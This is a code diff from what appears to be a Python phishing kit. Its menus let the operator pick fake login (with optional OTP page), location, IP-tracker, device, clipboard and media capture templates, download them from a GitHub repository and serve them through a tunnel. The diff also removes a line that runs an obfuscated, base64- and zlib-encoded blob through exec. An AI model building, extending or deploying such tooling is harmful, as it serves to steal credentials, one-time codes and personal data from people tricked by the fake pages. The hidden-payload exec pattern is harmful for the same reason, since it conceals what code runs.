+        if is_login and isfile(saved_file) and cat(saved_file)!="":
+            options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} Main Menu       {green}[{white}0{green}]{yellow} Exit"
+        else:
+            options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}x{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit"
+    lolcat(options)
 
 # Clear the screen and show logo
 def clear(fast=False, lol=False):
@@ -866,8 +1231,122 @@ def requirements():
 
         
 # Main Menu to choose phishing type
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'KrFz1Mw//97ngn2ek71CCj1TWyEFghBUtNf1qj5mFK2rp1wkwwJ8++aPP4Z/jO8Awc6Y0MaAkjanPqjyh2wwzugyI7jCX8d2y3pMaCI9waGQGvSHexbuV8N33ZW76iJSxcS56bw2U1XQOeK6GL4N++eaJmf5zZjoYxaQAXmv3vRaPH5bi7pfPaQb1xQTIKnzVGc+EJFz21Zq15DY8IUOFnvThDtRXn7D+mIqOCW6ITwLOJObEyk6rX48oGRTT3tLyj17tn/ACPHcXtDP3RXccqa7VcbyZrtrt80/Ig1SIFaE4PyDUKZ0uU0gOLVrq9MTIfmSgi7Y7fXTQV73fdDRSXkgk9devrgVzuRgcpp5kjb/DmZhHmfSjWfvNG2WF75glaqt0mkN8tYjw8FCsRwSJut7Zqo9Ds9GUlYkCby3/1iYsKlOpWVLu6HJZw57dHRJUCjSto0Ke1WxH1VszTa4p9OUz7wx6wVfnbszBOj4kXbUaXJFvn3bgiWFrXwvmxTUiXN8lgyujBpxJA/ZvcUcJ9IH3DO7wwRhb4ThWIIBkQW5fQDXhmRpVi8J9x0Em5iz+L4uB2Y2FvEZkZgTiu00Xkvv16hB3y4vZ4vtf9Nm8gRlcqhK9VJG94zbn4AALcBYC0YYLIxOsGggDS2m8oZ5teS3jn4J43AFdbSnH/c7P7nSdNsuvMzSKPs3FaJTkI7A1VOZBXFAP7MNTLEHnHnNM+nDp21f0EfxDQb9HbP/zJpFApFHsXQ9VjRit/nfGL8Ch0Yzcs+qHM5uWj6ncafRYhIP3UFDuSMV8bMBBPRiFM/OIEHbvO9BIVz3qALKMYos8oc+8shWpG8onHyUZXSrxTMftO+4B+FbjBVoK4EFE+RImuFo9jyJz83UdFSWjxBrB9Ts8Pp4fOrl6Zp6ic4yszo1u/8Rn0ydzZj2P3ysYSY2fFlo8Rvjkq/ag8sNesHYTOjuZU/O3lM+5nWPqRS6BsxcfzoW8A3sNzHE6C6Br/TV6CcHHS2WiT26EN1zqNIvv8gs1WhOHN0hjUI8hXIa1kpEVYnpm7iEZoAJ527yY5T8N193MiumFDWsJskV5NYES0RXuv7Na36jPp1yFUsyYNVbZE/ouCfp3hSVvZ4u0XMMTlyLD+AM9s8mwIl5XqhaLu4fqQy4zs44RAd5T/liiLepQ8AcKG7QQwLpcvSpEhkqlPYjynoW9MEVwAHkE103b6zyAQHeVKDGYd28xRprum1UgHuNxxpP/4DRj9DaRkkadTwRxigbHKzUgTicZbpGpioTB9dxpi7S02v2y+1WUF+7e57v+4samXxA+u6oMv5s8S45LFm5ummqK/sF3rBD5daYimOhYEvSc59k0S7zXLM2ZoIFCl5LIw40fB1CSv9GOX6ivMNRozoN7071QsJhrYEQ12e/QYNxoy07XmMig3ZnxYC7I+gXy48GFNlA6GSpagLUBwP+6OkkzdeNKIyaonFykMWsClI5MmqS2YLuT8eddeYSogsJjLajLSvZFDwkEoBkDBkpZjjG9bVUe6oLc5Vv78btJJ+rOYEf75d/WiDtOs/SN8UugrLyCV5QevIMMgDS3oSmNnIUWIY0b40Q5i7+XA4gwbVkbZKJ8U7Lzum1j5nr4Bm6SwAK+lu+DOsso0l3UTW2oprupP+ANGC8fI8XvdccuV3Mk6IRa6s7k3DyZE5NrTDvBqqEDEn12bqrxWVxjgOx7hlYP2BIcT52tkTJfAOx44ckJe74sHAxK3CUQXKqS6inUT3Gs1a83Vnk9vr+0paJwCVoGtVgKPOb5WJnnkdhwE9wB5+wX+77z//k93//f+s4DCHC3Nx3O1BxxKvHmteiuXA6zmYAjVNdjDMACgFpWU00NwJe'))
+def main_menu():
+    global ptype, mode
+    shell("stty -echoctl") # Skip printing ^C
+    if update:
+        updater()
+    requirements()
+    tempdata = cat(templates_file)
+    if is_json(tempdata):
+        templates = parse(tempdata)
+    else:
+        sprint(f"{error}templates.json file is corrupted!")
+        exit(1)
+    names = list(templates.keys())
+    choices = [str(i) for i in range(1,len(names)+1)]
+    while True:
+        clear(lol=True)
+        show_options(names)
+        if ptype is not None:
+            choice = ptype
+        elif mode == "test":
+            choice = default_type
+        else:
+            choice = input(f"{ask}Select one of the options > {green}")
+        if choice != "0" and choice.startswith("0"):
+            choice = choice.replace("0", "")
+        if choice in choices:
+            index = choices.index(choice)
+            phishing_type = names[index]
+            secondary_menu(templates[phishing_type], phishing_type)
+        elif choice.lower()=="a":
+            about()
+        elif choice.lower()=="s":
+            saved()
+        elif choice.lower()=="m":
+            shell("xdg-open \'https://github.com/KasRoudra/KasRoudra#My-Best-Works\'")
+        elif choice == "0":
+            pexit()
+        else:
+            sprint(f"{error}Wrong input {bred}\"{choice}\"")
+            ptype = None
 
+
+# Choose a template
+def secondary_menu(sites, name):
+    global mode, option, mask, redir_url
+    customdir = None
+    otp_folder = ""
+    names = [site["name"] for site in sites]
+    choices = [str(i) for i in range(1,len(sites)+1)]
+    while True:
+        clear(lol=True)
+        if len(sites) > 1:
+            show_options(names, is_main=False, is_login=True if name=="Login" else False)
+        else:
+            site = sites[0]
+            folder = site["folder"]
+            if "mask" in site:
+                mask = site["mask"]
+            if "redirect" in site:
+                redir_url = site["redirect"]
+            break
+        if option is not None:
+            choice = option
+        elif mode == "test":
+            choice = default_template
+        else:
+            choice = input(f"{ask}Select one of the options > {green}")
+        if choice != "0" and choice.startswith("0"):
+            choice = choice.replace("0", "")
+        if choice in choices:
+            site = sites[int(choice)-1] # Lists start from 0 but our index starts from 1
+            folder = site["folder"]
+            if "otp_folder" in site:
+                otp_folder = site["otp_folder"]
+            if "mask" in site:
+                mask = site["mask"]
+            if "redirect" in site:
+                redir_url = site["redirect"]
+            if folder == "custom" and mask == "custom":
+                customdir = customfol()
+            if otp_folder != "":
+                is_otp = input(f"{ask}Do you want OTP Page? [y/n] > {green}")
+                if is_otp == "y":
+                    folder = otp_folder
+            break
+        elif choice.lower()=="a":
+            about()
+        elif choice.lower()=="s":
+            saved()
+        elif choice.lower()=="x":
+            return
+        elif choice == "0":
+            pexit()
+        else:
+            sprint(f"{error}Wrong input {bred}\"{choice}\"")
+            option = None
+    if customdir is None:
+        site = f"{sites_dir}/{folder}"
+        if not isdir(site):
+            internet()
+            delete("site.zip")
+            download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
+            extract("site.zip", site)
+            remove("site.zip")
+        copy(site, site_dir)
+        if name == "Login":
+            set_login()
+        if name == "Image":
+            set_image()
+        if name == "ClipBoard":
+            set_redirect(redir_url, write=True)
+        if name in [ "Video", "Audio"]:
+            set_duration()
+        if name in ["Location", "IP Tracker", "Device"]:
+            set_redirect(redir_url)
+    server()
 # Start server and tunneling
 def server():
     global mode
